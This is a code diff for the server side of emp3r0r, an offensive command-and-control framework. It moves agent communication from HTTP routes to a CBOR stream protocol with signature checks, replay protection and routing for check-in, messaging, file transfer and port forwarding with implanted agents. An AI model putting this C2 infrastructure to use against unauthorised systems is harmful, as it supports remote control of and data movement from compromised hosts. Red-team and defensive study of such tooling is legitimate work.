@@ -1,496 +1,250 @@
 package server
 
 import (
-	"crypto/tls"
-	"crypto/x509"
+	"context"
 	"encoding/base64"
 	"fmt"
-	"net"
-	"net/http"
-	"net/http/httputil"
-	"net/url"
+	"io"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	"github.com/gorilla/mux"
+	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// replayNonceCache tracks nonces within the replay window.
-var replayNonceCache sync.Map
+var (
+	// replayNonceCache prevents MsgAuth replay attacks
+	replayNonceCache sync.Map
+	// checkinReadyChannels tracks agents waiting for their first checkin to finish
+	checkinReadyChannels sync.Map
+)
 
-// checkinReadyChannels tracks pending checkin completions by agent UUID
-// Channel is closed when public key is stored, waking up waiting requests
-var checkinReadyChannels sync.Map // map[string]chan struct{}
+// C2 Route Names are now shared via the def package:
+// def.C2RouteCheckin, def.C2RouteMsg, def.C2RouteFTP, def.C2RouteWWW, def.C2RouteProxy
 
+type c2RouteContext struct {
+	Service   string
+	AgentUUID string
+	StreamID  string
+}
+
+func abs64(n int64) int64 {
+	if n < 0 {
+		return -n
+	}
+	return n
+}
+
+// closeCheckinReadyChannel signals that an agent's first check-in is complete
 func closeCheckinReadyChannel(agentUUID string) {
-	if v, ok := checkinReadyChannels.LoadAndDelete(agentUUID); ok {
-		readyChan := v.(chan struct{})
-		defer func() {
-			if r := recover(); r != nil {
-				logging.Debugf("closeCheckinReadyChannel: channel for %s already closed", strconv.Quote(agentUUID))
-			}
-		}()
-		close(readyChan)
+	if val, ok := checkinReadyChannels.Load(agentUUID); ok {
+		if ch, ok := val.(chan struct{}); ok {
+			close(ch)
+		}
+		checkinReadyChannels.Delete(agentUUID)
 	}
 }
 
-// verifyAgentCAOnly validates CA signature only (for new agent checkin/TOFU).
-// This allows new agents to check in without their public key being known yet.
-func verifyAgentCAOnly(wrt http.ResponseWriter, req *http.Request) (agentUUID string, ok bool) {
-	agentUUID = util.StripANSI(req.Header.Get(transport.HeaderClientID))
-	signedTS := util.StripANSI(req.Header.Get(transport.HeaderRequestTimestamp))
-	nonce := util.StripANSI(req.Header.Get(transport.HeaderRequestNonce))
-	caSigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientCASignature))
-
-	if agentUUID == "" || signedTS == "" || nonce == "" || caSigB64 == "" {
-		logging.Warningf("verifyAgentCAOnly: missing auth headers from %s", req.RemoteAddr)
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return "", false
+// normalizeRouteFromMsgAuth interprets MsgAuth capabilities as routing information.
+// Exactly one configured route capability must be provided; no default/fallback route is allowed.
+func normalizeRouteFromMsgAuth(msg *def.MsgAuth) (c2RouteContext, error) {
+	ctx := c2RouteContext{
+		AgentUUID: msg.AgentUUID,
+		StreamID:  msg.StreamID,
+	}
+	if msg == nil || len(msg.Capabilities) == 0 {
+		return ctx, fmt.Errorf("missing route capability")
 	}
 
-	ts, err := strconv.ParseInt(signedTS, 10, 64)
-	if err != nil {
-		logging.Warningf("verifyAgentCAOnly: bad timestamp %s: %v", strconv.Quote(signedTS), err)
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return "", false
-	}
-	now := time.Now().Unix()
-	if ts <= 0 || abs64(now-ts) > transport.ReplayWindowSeconds {
-		logging.Warningf("verifyAgentCAOnly: timestamp outside window for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return "", false
+	allowed := map[string]struct{}{
+		live.RuntimeConfig.C2Routes.Checkin: {},
+		live.RuntimeConfig.C2Routes.Msg:     {},
+		live.RuntimeConfig.C2Routes.FTP:     {},
+		live.RuntimeConfig.C2Routes.WWW:     {},
+		live.RuntimeConfig.C2Routes.Proxy:   {},
 	}
 
-	// Replay protection
-	nonceKey := agentUUID + ":" + nonce
-	if prev, loaded := replayNonceCache.Load(nonceKey); loaded {
-		if prevTS, okTS := prev.(int64); okTS && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
-			logging.Warningf("verifyAgentCAOnly: replay detected for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
-			http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-			return "", false
+	seen := ""
+	for _, cap := range msg.Capabilities {
+		c := strings.ToLower(strings.TrimSpace(cap))
+		if _, ok := allowed[c]; !ok {
+			continue
 		}
-	}
-	replayNonceCache.Store(nonceKey, ts)
-	replayNonceCache.Range(func(k, v any) bool {
-		if cachedTS, ok := v.(int64); ok && abs64(now-cachedTS) > transport.ReplayWindowSeconds {
-			replayNonceCache.Delete(k)
+		if seen != "" && seen != c {
+			return ctx, fmt.Errorf("multiple route capabilities are not allowed")
 		}
-		return true
+		seen = c
+	}
+	if seen == "" {
+		return ctx, fmt.Errorf("no configured route capability provided")
+	}
+	ctx.Service = seen
+	return ctx, nil
+}
+
+// cborProtocolDispatch is the entry point for the pure-CBOR C2 protocol.
+// It performs initial auth, protects against replays, and routes the stream
+// to the appropriate persistent or one-shot handler.
+func cborProtocolDispatch(t transport.C2Transport) {
+	defer func() {
+		if r := recover(); r != nil {
+			logging.Errorf("cborProtocolDispatch panic: %v\n%s", r, util.CallStack())
+		}
+	}()
+
+	// ── Step ①: CA verification ──────────────────────────────────────────────
+	// The very first CBOR frame MUST be a MsgAuth envelope.
+	// All C2 comms are PSK-encrypted from the start.
+	// Set a timeout for the initial handshake to prevent deadlocks.
+	timer := time.AfterFunc(10*time.Second, func() {
+		_ = t.Close()
 	})
+	defer timer.Stop()
 
-	// Verify CA signature
-	caSig, err := base64.URLEncoding.DecodeString(caSigB64)
-	if err != nil {
-		logging.Warningf("verifyAgentCAOnly: invalid CA signature encoding for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return "", false
+	secureConn := transport.NewSecureConn(t)
+	defer t.Close() // Ensure connection is closed when dispatch or persistent handler returns
+
+	remoteAddr := t.RemoteAddrString()
+	dec := cbor.NewDecoder(secureConn)
+	var msgAuth def.MsgAuth
+	if err := dec.Decode(&msgAuth); err != nil {
+		logging.Warningf("cborProtocolDispatch: first frame decode failed from %s: %v", remoteAddr, err)
+		return
 	}
-	caValid, err := transport.VerifySignatureWithCA([]byte(agentUUID), caSig)
-	if err != nil || !caValid {
-		logging.Warningf("verifyAgentCAOnly: CA verification failed for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return "", false
+	logging.Debugf("cborProtocolDispatch: decoded MsgAuth from %s: type=%d agent=%s", remoteAddr, msgAuth.Type, msgAuth.AgentUUID)
+
+	if err := transport.VerifyMsgAuth(&msgAuth); err != nil {
+		logging.Warningf("cborProtocolDispatch: MsgAuth CA verification failed from %s: %v", remoteAddr, err)
+		return
 	}
+	logging.Debugf("cborProtocolDispatch: MsgAuth CA verified from %s", remoteAddr)
 
-	return agentUUID, true
-}
-
-func verifyAgentRequest(wrt http.ResponseWriter, req *http.Request, expectedAgent string, sessionCheck func(string) bool) bool {
-	agentUUID := util.StripANSI(req.Header.Get(transport.HeaderClientID))
-	signedTS := util.StripANSI(req.Header.Get(transport.HeaderRequestTimestamp))
-	nonce := util.StripANSI(req.Header.Get(transport.HeaderRequestNonce))
-	sigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientSignature))
-	caSigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientCASignature))
-
-	if agentUUID == "" || signedTS == "" || nonce == "" || sigB64 == "" || caSigB64 == "" {
-		logging.Warningf("verifyAgentRequest: missing auth headers from %s", req.RemoteAddr)
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return false
+	// ── Step ①.⑤: Pinned Key (TOFU) Verification ────────────────────────────
+	// If the agent is already known (in memory or DB), the provided AgentProof MUST match the pinned key.
+	var pinnedKey string
+	if agent := agents.GetAgentByUUID(msgAuth.AgentUUID); agent != nil {
+		pinnedKey = agent.PublicKey
 	}
-
-	if expectedAgent != "" && expectedAgent != agentUUID {
-		logging.Warningf("verifyAgentRequest: agent mismatch, expected %s got %s", strconv.Quote(expectedAgent), strconv.Quote(agentUUID))
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-
-	ts, err := strconv.ParseInt(signedTS, 10, 64)
-	if err != nil {
-		logging.Warningf("verifyAgentRequest: bad timestamp %s: %v", strconv.Quote(signedTS), err)
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return false
-	}
-	now := time.Now().Unix()
-	if ts <= 0 || abs64(now-ts) > transport.ReplayWindowSeconds {
-		logging.Warningf("verifyAgentRequest: timestamp outside window for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
-		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-		return false
-	}
-
-	// Replay protection: nonce + agent scoped within the replay window.
-	nonceKey := agentUUID + ":" + nonce
-	if prev, ok := replayNonceCache.Load(nonceKey); ok {
-		if prevTS, okTS := prev.(int64); okTS && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
-			logging.Warningf("verifyAgentRequest: replay detected for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
-			http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
-			return false
-		}
-	}
-	replayNonceCache.Store(nonceKey, ts)
-	replayNonceCache.Range(func(k, v any) bool {
-		if cachedTS, ok := v.(int64); ok && abs64(now-cachedTS) > transport.ReplayWindowSeconds {
-			replayNonceCache.Delete(k)
-		}
-		return true
-	})
-
-	caSig, err := base64.URLEncoding.DecodeString(caSigB64)
-	if err != nil {
-		logging.Warningf("verifyAgentRequest: invalid CA signature encoding for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-	caValid, err := transport.VerifySignatureWithCA([]byte(agentUUID), caSig)
-	if err != nil || !caValid {
-		logging.Warningf("verifyAgentRequest: CA verification failed for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-
-	pubKey, err := resolveAgentPublicKey(agentUUID)
-	if err != nil || pubKey == "" {
-		logging.Warningf("verifyAgentRequest: cannot resolve public key for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-
-	canonical := transport.CanonicalRequestString(req.Method, req.URL.Path, req.URL.RawQuery, signedTS, nonce)
-	sig, err := base64.URLEncoding.DecodeString(sigB64)
-	if err != nil {
-		logging.Warningf("verifyAgentRequest: invalid signature encoding for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-	okSig, err := transport.VerifySignatureWithPEM([]byte(pubKey), []byte(canonical), sig)
-	if err != nil || !okSig {
-		logging.Warningf("verifyAgentRequest: signature verification failed for %s: %v", strconv.Quote(agentUUID), err)
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-
-	if sessionCheck != nil && !sessionCheck(agentUUID) {
-		logging.Warningf("verifyAgentRequest: session validation failed for %s", strconv.Quote(agentUUID))
-		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
-		return false
-	}
-
-	return true
-}
-
-func resolveAgentPublicKey(agentUUID string) (string, error) {
-	logging.Infof("resolveAgentPublicKey: attempting to resolve key for agent %s", strconv.Quote(agentUUID))
-
-	// Check if there's a pending checkin for this agent
-	if readyChanVal, exists := checkinReadyChannels.Load(agentUUID); exists {
-		readyChan := readyChanVal.(chan struct{})
-		logging.Infof("resolveAgentPublicKey: waiting for checkin to complete for %s", strconv.Quote(agentUUID))
-
-		// Wait for checkin handler to signal completion (or timeout)
-		select {
-		case <-readyChan:
-			logging.Infof("resolveAgentPublicKey: checkin completed for %s, retrieving key", strconv.Quote(agentUUID))
-		case <-time.After(5 * time.Second):
-			logging.Warningf("resolveAgentPublicKey: timeout waiting for checkin to complete for %s", strconv.Quote(agentUUID))
-			return "", fmt.Errorf("timeout waiting for checkin to complete")
+	if pinnedKey == "" {
+		if stored, err := agents.GetStoredAgent(msgAuth.AgentUUID); err == nil && stored != nil {
+			pinnedKey = stored.PublicKey
 		}
 	}
 
-	// Now retrieve the public key (should be available after channel closed)
-	if agent := agents.GetAgentByUUID(agentUUID); agent != nil {
-		if logging.Level >= 4 {
-			logging.Debugf("resolveAgentPublicKey: found agent %s in memory, pubkey length=%d", strconv.Quote(agentUUID), len(agent.PublicKey))
+	if pinnedKey != "" {
+		if msgAuth.AgentProof == "" {
+			logging.Warningf("cborProtocolDispatch: agent %s is known but provided no AgentProof from %s", strconv.Quote(msgAuth.AgentUUID), remoteAddr)
+			return
 		}
-		if agent.PublicKey != "" {
-			logging.Infof("resolveAgentPublicKey: successfully resolved key from memory for %s", strconv.Quote(agentUUID))
-			return agent.PublicKey, nil
-		}
-	}
-
-	// Fallback to database
-	logging.Warningf("resolveAgentPublicKey: agent %s not found in memory, trying database", strconv.Quote(agentUUID))
-	if agents.AgentDB != nil {
-		stored, err := agents.GetStoredAgent(agentUUID)
+		proof, err := base64.URLEncoding.DecodeString(msgAuth.AgentProof)
 		if err != nil {
-			return "", err
+			logging.Warningf("cborProtocolDispatch: decode agent proof failed for %s from %s: %v", strconv.Quote(msgAuth.AgentUUID), remoteAddr, err)
+			return
 		}
-		if stored != nil {
-			if logging.Level >= 4 {
-				logging.Debugf("resolveAgentPublicKey: found agent %s in DB, pubkey length=%d", strconv.Quote(agentUUID), len(stored.PublicKey))
-			}
-			if stored.PublicKey != "" {
-				logging.Infof("resolveAgentPublicKey: successfully resolved key from DB for %s", strconv.Quote(agentUUID))
-				return stored.PublicKey, nil
-			}
+		canonical := transport.CanonicalAuthString(msgAuth.AgentUUID, msgAuth.Timestamp, msgAuth.Nonce, msgAuth.Capabilities)
+		ok, err := transport.VerifySignatureWithPEM([]byte(pinnedKey), []byte(canonical), proof)
+		if err != nil || !ok {
+			logging.Warningf("cborProtocolDispatch: pinned key verification failed for agent %s from %s (ok=%v, err=%v)", strconv.Quote(msgAuth.AgentUUID), remoteAddr, ok, err)
+			return
+		}
+		logging.Debugf("cborProtocolDispatch: pinned key verified for agent %s", strconv.Quote(msgAuth.AgentUUID))
+	} else {
+		logging.Debugf("cborProtocolDispatch: agent %s is new or has no pinned key", strconv.Quote(msgAuth.AgentUUID))
+	}
+
+	// ── Step ②: Replay protection ────────────────────────────────────────────
+	now := time.Now().Unix()
+	nonceKey := msgAuth.AgentUUID + ":" + msgAuth.Nonce
+	if prev, loaded := replayNonceCache.Load(nonceKey); loaded {
+		if prevTS, ok := prev.(int64); ok && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
+			logging.Warningf("cborProtocolDispatch: replay detected for agent %s from %s", strconv.Quote(msgAuth.AgentUUID), remoteAddr)
+			return
 		}
 	}
-	logging.Errorf("resolveAgentPublicKey: public key for agent %s not found in memory or DB", strconv.Quote(agentUUID))
-	return "", fmt.Errorf("public key for agent %s not found", agentUUID)
-}
-
-func validatePortFwdSessionOwner(sessionID, agentUUID string) bool {
-	if sessionID == "" {
-		return false
-	}
-
-	// Extract base session ID (subsessions have format: sessionID_portNumber)
-	baseSessionID := sessionID
-	if strings.Contains(sessionID, "_") {
-		baseSessionID = strings.Split(sessionID, "_")[0]
-	}
-
-	val, ok := network.PortFwds.Load(baseSessionID)
-	if !ok {
-		return false
-	}
-	pf := val.(*network.PortFwdSession)
-	if pf.Agent != nil && pf.Agent.UUID != "" {
-		return pf.Agent.UUID == agentUUID
-	}
-	return true
-}
-
-func abs64(v int64) int64 {
-	if v < 0 {
-		return -v
-	}
-	return v
-}
-
-// apiDispatcher routes requests to the correct handler.
-func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
-	defer func() {
-		if r := recover(); r != nil {
-			if r == http.ErrAbortHandler {
-				return
-			}
-			logging.Errorf("apiDispatcher panicked: %v", r)
-			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
+	replayNonceCache.Store(nonceKey, msgAuth.Timestamp)
+	// purge stale entries
+	replayNonceCache.Range(func(k, v any) bool {
+		if cachedTS, ok := v.(int64); ok && abs64(now-cachedTS) > transport.ReplayWindowSeconds {
+			replayNonceCache.Delete(k)
 		}
-	}()
-	vars := mux.Vars(req)
+		return true
+	})
 
-	if vars["api"] == "" || vars["token"] == "" {
-		logging.Debugf("Invalid request: %v, missing api/token", req)
-		wrt.WriteHeader(http.StatusNotFound)
+	// ── Dispatch by Capabilities ──────────────────────────────────────────────
+	routeCtx, routeErr := normalizeRouteFromMsgAuth(&msgAuth)
+	if routeErr != nil {
+		logging.Warningf("cborProtocolDispatch: invalid route capabilities for agent %s from %s: %v", strconv.Quote(msgAuth.AgentUUID), remoteAddr, routeErr)
 		return
 	}
+	logging.Infof("cborProtocolDispatch: service=%s agent=%s from %s", routeCtx.Service, strconv.Quote(msgAuth.AgentUUID), remoteAddr)
 
-	logging.Debugf("Got a request: api=%s, token=%s", vars["api"], vars["token"])
-
-	// forward to operator
-	// checkin path
-	checkinPath := live.RuntimeConfig.CheckInPath
-	if checkinPath == "" {
-		checkinPath = "checkin"
-	}
-	if logging.Level >= 4 {
-		logging.Debugf("apiDispatcher: checkinPath configured as %s", strconv.Quote(checkinPath))
-	}
-
-	// msg path
-	msgPath := live.RuntimeConfig.MsgPath
-	if msgPath == "" {
-		msgPath = "msg"
-	}
-	if logging.Level >= 4 {
-		logging.Debugf("apiDispatcher: msgPath configured as %s, incoming api=%s", strconv.Quote(msgPath), strconv.Quote(vars["api"]))
-	}
-
-	// ftp path
-	ftpPath := live.RuntimeConfig.FTPPath
-	if ftpPath == "" {
-		ftpPath = "ftp"
-	}
-
-	// www path
-	wwwPath := live.RuntimeConfig.WWWPath
-	if wwwPath == "" {
-		wwwPath = "www"
-	}
-
-	// proxy path
-	proxyPath := live.RuntimeConfig.ProxyPath
-	if proxyPath == "" {
-		proxyPath = "proxy"
-	}
-
-	// Create base target URL for operator proxying
-	// Use the remote address (operator's IP in the WireGuard network)
-	remoteIP, _, _ := net.SplitHostPort(req.RemoteAddr)
-
-	// Determine target IP based on connection source
-	targetIP := netutil.WgOperatorIP // Default to primary operator (for direct agents)
-
-	// If request comes from a Relay (WG subnet) or Localhost, proxy back to it
-	ip := net.ParseIP(remoteIP)
-	if ip != nil {
-		if ip.IsLoopback() {
-			targetIP = remoteIP
-		} else {
-			_, subnet, _ := net.ParseCIDR(netutil.WgSubnet)
-			if subnet != nil && subnet.Contains(ip) {
-				targetIP = remoteIP
-			}
+	switch routeCtx.Service {
+	case live.RuntimeConfig.C2Routes.Checkin:
+		agentUUID := msgAuth.AgentUUID
+		if agentUUID != "" {
+			defer closeCheckinReadyChannel(agentUUID)
+			readyChan := make(chan struct{})
+			checkinReadyChannels.Store(agentUUID, readyChan)
 		}
-	}
-
-	targetURL := fmt.Sprintf("https://%s:%d", targetIP, netutil.WgRelayedHTTPPort)
-	parsedURL, err := url.Parse(targetURL)
-	if err != nil {
-		logging.Errorf("apiDispatcher: parsedURL: %v", err)
-		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
-		return
-	}
-
-	proxy := httputil.NewSingleHostReverseProxy(parsedURL)
-
-	// Set up a proper director function to preserve query parameters and other request properties
-	originalDirector := proxy.Director
-	proxy.Director = func(req *http.Request) {
-		originalDirector(req)
-		logging.Debugf("Proxying to: %s%s?%s", req.URL.Host, req.URL.Path, req.URL.RawQuery)
-	}
-
-	rootCAs := x509.NewCertPool()
-	capem, err := os.ReadFile(transport.OperatorCaCrtFile)
-	if err != nil {
-		logging.Errorf("apiDispatcher: parse CA cert: %v", err)
-		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
-		return
-	}
-	rootCAs.AppendCertsFromPEM([]byte(transport.CACrtPEM))
-	rootCAs.AppendCertsFromPEM(capem)
-	tlsConfig := &tls.Config{
-		ServerName:         netutil.WgOperatorIP, // Use the first operator's IP as the SNI, as it is in the SAN list
-		InsecureSkipVerify: false,
-		RootCAs:            rootCAs,
-	}
-	proxy.Transport = &http.Transport{
-		TLSClientConfig:   tlsConfig,
-		ForceAttemptHTTP2: true,
-	}
-	// Add error handling for debugging
-	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
-		logging.Errorf("Proxy error: %v", err)
-		http.Error(w, "Proxy error", http.StatusBadGateway)
-	}
-	// Use the original request's context
-	req = req.WithContext(req.Context())
-
-	// handlers
-	logging.Infof("apiDispatcher: routing request to api=%s, token=%s", strconv.Quote(vars["api"]), strconv.Quote(vars["token"]))
-	switch vars["api"] {
-	case checkinPath:
-		logging.Infof("apiDispatcher: routing to handleAgentCheckIn (checkin path)")
-		// Checkin uses CA-only validation (TOFU: agent public key sent in CBOR body)
-		agentUUID, ok := verifyAgentCAOnly(wrt, req)
-		if !ok {
-			return
+		if err := handleAgentCheckInStream(dec, agentUUID, remoteAddr); err != nil {
+			logging.Warningf("cborProtocolDispatch: checkin error for %s: %v", strconv.Quote(agentUUID), err)
 		}
-		defer closeCheckinReadyChannel(agentUUID)
 
-		// Synchronization channel creation
-		readyChan := make(chan struct{})
-		checkinReadyChannels.Store(agentUUID, readyChan)
-		handleAgentCheckIn(wrt, req, agentUUID)
-	case msgPath:
-		logging.Infof("apiDispatcher: routing to handleMessageTunnel (msg path)")
-		// Message tunnel requires full validation (agent must have checked in first)
-		// Token in URL is session/connection identifier, not necessarily agent UUID
-		if !verifyAgentRequest(wrt, req, "", nil) {
-			return
-		}
-		handleMessageTunnel(wrt, req)
-	case ftpPath:
-		if !verifyAgentRequest(wrt, req, "", nil) {
-			return
-		}
-		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
-		logging.Debugf("Request headers: %v", req.Header)
-		proxy.ServeHTTP(wrt, req)
-	case wwwPath:
-		if !verifyAgentRequest(wrt, req, vars["token"], nil) {
-			return
-		}
-		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
-		logging.Debugf("Request headers: %v", req.Header)
-		logging.Debugf("Forwarding PUT request to operator at %s", targetURL)
-		proxy.ServeHTTP(wrt, req)
-	case proxyPath:
-		sessionID := vars["token"]
-		if !verifyAgentRequest(wrt, req, "", func(agentUUID string) bool {
-			return validatePortFwdSessionOwner(sessionID, agentUUID)
-		}) {
-			return
-		}
-		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
-		logging.Debugf("Request headers: %v", req.Header)
-		logging.Debugf("Forwarding port mapping request to operator at %s", targetURL)
-		proxy.ServeHTTP(wrt, req)
+	case live.RuntimeConfig.C2Routes.Msg:
+		handleMessageTunnelStream(secureConn, dec, remoteAddr, context.Background())
+
+	case live.RuntimeConfig.C2Routes.FTP:
+		// Provide a cancel function to terminate the connection properly
+		ctx, cancel := context.WithCancel(context.Background())
+		handleFileUploadStream(secureConn, routeCtx.StreamID, remoteAddr, ctx, cancel)
+
+	case live.RuntimeConfig.C2Routes.Proxy:
+		_, cancel := context.WithCancel(context.Background())
+		network.HandlePortFwdStream(&network.StreamHandler{}, secureConn, routeCtx.StreamID, remoteAddr, cancel)
+
+	case live.RuntimeConfig.C2Routes.WWW:
+		handleFileDownloadStream(secureConn, routeCtx.StreamID, remoteAddr)
+
+
 	default:
-		logging.Warningf("apiDispatcher: 404 for api=%s, token=%s (expected checkin=%s, msg=%s, ftp=%s, www=%s, proxy=%s)", vars["api"], vars["token"], checkinPath, msgPath, ftpPath, wwwPath, proxyPath)
-		wrt.WriteHeader(http.StatusNotFound)
+		logging.Warningf("cborProtocolDispatch: service %q is disabled or unknown for agent %s from %s", routeCtx.Service, strconv.Quote(msgAuth.AgentUUID), remoteAddr)
 	}
 }
 
-// operationDispatcher routes operator requests to the correct handler.
-func operationDispatcher(w http.ResponseWriter, r *http.Request) {
-	defer func() {
-		if r := recover(); r != nil {
-			if r == http.ErrAbortHandler {
-				return
-			}
-			logging.Errorf("operationDispatcher panicked: %v", r)
-			http.Error(w, "Internal server error", http.StatusInternalServerError)
-		}
-	}()
-	vars := mux.Vars(r)
-	api := vars["api"]
-	logging.Debugf("Operator request: API: %s", api)
+// cborStreamAccept is the single HTTP handler for agent connections.
+func cborStreamAccept(t transport.C2Transport) {
+	cborProtocolDispatch(t)
+}
 
-	api = fmt.Sprintf("%s/%s", transport.OperatorRoot, api)
-	switch api {
-	case transport.OperatorMsgTunnel:
-		handleOperatorConn(w, r)
-	case transport.OperatorSetActiveAgent:
-		handleSetActiveAgent(w, r)
-	case transport.OperatorSendCommand:
-		handleSendCommand(w, r)
-	case transport.OperatorListConnectedAgents:
-		handleListAgents(w, r)
-	case transport.OperatorForgetAgent:
-		handleForgetAgent(w, r)
-	case transport.OperatorListPortFwds:
-		handleListPortFwds(w, r)
-	case transport.OperatorRegisterPortFwd:
-		handleRegisterPortFwd(w, r)
-	case transport.OperatorUnregisterPortFwd:
-		handleUnregisterPortFwd(w, r)
-	case transport.OperatorGetCA:
-		handleGetCA(w, r)
-	case transport.OperatorSignAgent:
-		handleSignAgent(w, r)
-	default:
-		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusNotFound)
+// handleFileDownloadStream serves files from the WWW directory to agents.
+func handleFileDownloadStream(conn io.ReadWriteCloser, filename string, remoteAddr string) {
+	defer conn.Close()
+
+	// SECURITY: Ensure the filename is just a basename to prevent path traversal
+	filename = filepath.Base(filename)
+	path := live.Temp + transport.WWW + filename
+
+	f, err := os.Open(path)
+	if err != nil {
+		logging.Warningf("handleFileDownloadStream: open %s failed: %v", path, err)
+		return
 	}
+	defer f.Close()
+
+	n, err := io.Copy(conn, f)
+	if err != nil {
+		logging.Errorf("handleFileDownloadStream: served %s to %s failed: %v", filename, remoteAddr, err)
+		return
+	}
+	logging.Infof("handleFileDownloadStream: served %s (%d bytes) to %s", filename, n, remoteAddr)
 }
